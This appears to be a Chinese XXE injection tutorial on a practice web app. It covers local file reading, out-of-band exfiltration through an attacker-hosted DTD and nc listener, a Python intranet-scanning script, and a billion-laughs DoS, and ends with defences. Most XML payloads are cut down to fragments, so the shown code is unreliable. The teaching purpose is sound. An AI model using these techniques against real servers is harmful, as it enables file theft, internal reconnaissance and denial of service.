我们点击下面的Any bugs然后用burp抓包
我们随便输入下
从上面我们可以看到，web应用正在解析xml的内容，接受用户特定或者自定义的输入，然后呈现给用户。为了验证，我们可以构造如下的输入：
    ]>
    bee33333;&test;Any bugs?
可以看到应用程序确实是直接解析了xml，那么如果xml文档中有一个参数是用来调用远程服务器的内容？这个参数是可控的,我们可以做什么？
**XXE漏洞-文件读取**
PHP中测试POC
[File:///path/to/file.ext](File:///%5C%5Cpath%5Cto%5Cfile.ext)
PHP://filter/read=convert.base64-encode/resource=/home/bee/test.php
**读取文档**
**有回显的xxe利用**
Payload:
    ]>
    〈xxe>&xxe;
**读取php文件**
直接读取php文件会报错，因为php文件里面有<>//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，
直接利用file协议读取PHP文件，就会产生报错。那么需要base64编码来读取，
Payload：
    ]>
进行解密后得到对应内容
**本地测试无回显注入读取文件**
但是，在实际情况中，大多数情况下服务器上的 XML
并不是输出用的，所以就少了输出这一环节，这样的话，即使漏洞存在，我们的payload的也被解析了，但是由于没有输出，我们也不知道解析得到的内容是什么，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带数据
先看一下漏洞示例：
相较于前面有回显的漏洞代码，我们去掉了内容输出的一部分。这样，用之前的payload就没有作用了：
Payload的构造：
有了前面使用外部DTD文件来拼接内部DTD的参数实体的经验，我们可以知道，通过外部DTD的方式可以将内部参数实体的内容与外部DTD声明的实体的内容拼接起来，那么我们就可以有这样的设想：
  1. 客户端发送payload 1给web服务器
  2. web服务器向vps获取恶意DTD，并执行文件读取payload2
  3. web服务器带着回显结果访问VPS上特定的FTP或者HTTP
  4. 通过VPS获得回显（nc监听端口）
首先，我们使用ncat监听一个端口：
也可以用python创建一个建议的http服务。
    python -m SimpleHTTPServer 端口
然后，我们构造payload：
我们选择使用外部DTD，在我们自己所能掌控（或是自己搭建）的主机上编写一个dtd文件：
    ”>
    %all;
我们注意到，第一个参数实体的声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。
Payload如下：
    &send;
如图，我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。
开始攻击：
然后查看我们的端口监听情况，会发现我们收到了一个连接请求，问号后面的内容就是我们读取到的文件内容经过编码后的字符串：
Ps：
有时候也会出现报错的情况（这是我们在漏洞的代码中没有屏蔽错误和警告），比如我们这里的payload没有选用php的base64编码，这里报错了，但是同时也将所读取的内容爆了出来，只是特殊字符经过了HTML实体编码。
**内网探测**
xxe 由于可以访问外部 url，也就有类似 ssrf 的攻击效果，同样的，也可以利用 xxe 来进行内网探测。
可以先通过 file 协议读取一些配置文件来判断内网的配置以及规模，以便于编写脚本来探测内网。
一个 python 脚本实例：
    import requests
    import base64
    #Origtional XML that the server accepts
    #
    #    user
    #
    def build_xml(string):
        xml = """"""
        xml = xml + "\r\n" + """"""
        xml = xml + "\r\n" + """]>"""
        xml = xml + "\r\n" + """"""
        xml = xml + "\r\n" + """    &xxe;"""
        xml = xml + "\r\n" + """"""
        send_xml(xml)
    def send_xml(xml):
        headers = {'Content-Type': 'application/xml'}
        x = requests.post('http://127.0.0.1/xml.php', data=xml, headers=headers, timeout=5).text
        coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
        print coded_string
    #   print base64.b64decode(coded_string)
    for i in range(1, 255):
        try:
            i = str(i)
            ip = '192.168.1.' + i
            string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
            print string
            build_xml(string)
        except:
          print "error"
    continue
运行起来大概是这样
**DDOS攻击**
    ]>
    &lol9;
该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个”abc”字符串，从而导致 DDoS
攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。
### 影响:
此漏洞非常危险, 因为此漏洞会造成服务器上敏感数据的泄露，和潜在的服务器拒绝服务攻击。
## 防御方法：
  1. 禁用外部实体
  2. 过滤和验证用户提交的XML数据
  3. 不允许XML中含有任何自己声明的DTD
  4. 有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可
参考文章如下：
https://www.freebuf.com/articles/web/86007.html